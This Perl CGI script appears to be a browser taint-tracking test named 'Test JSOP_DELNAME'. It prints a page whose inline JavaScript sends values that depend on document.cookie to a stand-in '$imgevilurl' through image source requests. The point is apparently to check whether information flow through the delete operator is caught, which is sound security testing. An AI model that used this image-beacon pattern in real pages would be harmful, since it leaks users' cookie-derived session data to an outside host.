#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_DELNAME";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		// shouldn't be evil 
		var notevil = 1;
		var url = "$imgevilurl?normal=" + delete notevil;
		document.images[0].src = url;
		
		// if with evil val 		
		var url2 = "$imgevilurl?if=";
		var notevil2 = 1;
		var result;
		if ($evil) {
			 result = delete notevil2;
		}
		url2 = url2 + notevil2;
		document.images[1].src = url2;
		
		// normal usage 
		if ($evil) {
			var notevil3 = 3;
		}		
		var url3 = "$imgevilurl?isevil=" + delete notevil3;
		document.images[2].src = url3;
		
    </script>
|;

require "xss_basic_footer.pl";
